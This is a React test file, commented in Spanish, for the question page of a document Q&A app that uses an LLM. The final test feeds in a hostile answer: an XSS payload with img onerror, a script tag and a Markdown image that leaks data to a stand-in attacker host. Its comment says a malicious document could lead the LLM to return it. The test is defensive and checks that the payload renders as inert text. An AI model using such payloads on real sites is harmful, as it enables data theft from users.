import { render, screen } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { describe, expect, it } from 'vitest'
import { jsonResponse, mockFetch } from '../test/mockFetch'
import type { QueryResponse } from '../types/api'
import { AskPage } from './AskPage'

const SOURCE = {
  document_id: '11111111-1111-4111-8111-111111111111',
  filename: 'manual.pdf',
  page_number: 3,
  chunk_id: 'c1',
  excerpt: 'Cada empleado dispone de 22 días hábiles.',
  score: 0.03,
}

async function ask(question: string) {
  // paste en lugar de type: type genera eventos tecla a tecla y es lento en jsdom.
  await userEvent.click(screen.getByLabelText('Pregunta'))
  await userEvent.paste(question)
  await userEvent.click(screen.getByRole('button', { name: 'Preguntar' }))
}

describe('AskPage', () => {
  it('muestra la respuesta con sus fuentes enlazadas', async () => {
    const answer: QueryResponse = {
      answer: 'Tienes 22 días hábiles de vacaciones.',
      sources: [SOURCE],
      insufficient_evidence: false,
    }
    const fetchSpy = mockFetch(jsonResponse(answer))
    render(<AskPage />)

    await ask('  ¿Cuántos días de vacaciones?  ')

    expect(await screen.findByText(answer.answer)).toBeInTheDocument()
    expect(screen.getByRole('link', { name: 'manual.pdf' })).toHaveAttribute(
      'href',
      `#/documentos/${SOURCE.document_id}`,
    )
    expect(screen.getByText(', página 3')).toBeInTheDocument()
    expect(screen.getByText(SOURCE.excerpt)).toBeInTheDocument()
    // La pregunta se envía sin espacios sobrantes.
    expect(JSON.parse(fetchSpy.mock.calls[0][1]?.body as string)).toEqual({
      question: '¿Cuántos días de vacaciones?',
    })
  })

  it('explica cuando no hay evidencia suficiente', async () => {
    mockFetch(
      jsonResponse({
        answer: 'No encontré información en los documentos disponibles.',
        sources: [],
        insufficient_evidence: true,
      }),
    )
    render(<AskPage />)

    await ask('¿Receta de paella?')

    expect(await screen.findByText('Sin evidencia suficiente')).toBeInTheDocument()
    expect(screen.queryByText('Fuentes')).not.toBeInTheDocument()
  })

  it('muestra los errores del servidor de forma comprensible', async () => {
    mockFetch(jsonResponse({ detail: 'El proveedor de LLM no tiene saldo.' }, 503))
    render(<AskPage />)

    await ask('hola')

    expect(await screen.findByRole('alert')).toHaveTextContent('no tiene saldo')
  })

  it('no permite enviar una pregunta vacía', () => {
    render(<AskPage />)

    expect(screen.getByRole('button', { name: 'Preguntar' })).toBeDisabled()
  })

  it('muestra el HTML de una respuesta del LLM como texto inerte (XSS)', async () => {
    // Un documento malicioso podría inducir al LLM a devolver HTML o Markdown peligroso.
    const malicious =
      'Respuesta <img src=x onerror="alert(1)"> <script>alert(2)</script> ' +
      '![x](https://atacante.example/robar?d=secreto)'
    mockFetch(jsonResponse({ answer: malicious, sources: [SOURCE], insufficient_evidence: false }))
    const { container } = render(<AskPage />)

    await ask('hola')

    expect(await screen.findByText(malicious)).toBeInTheDocument()
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('a[href*="atacante"]')).toBeNull()
  })
})
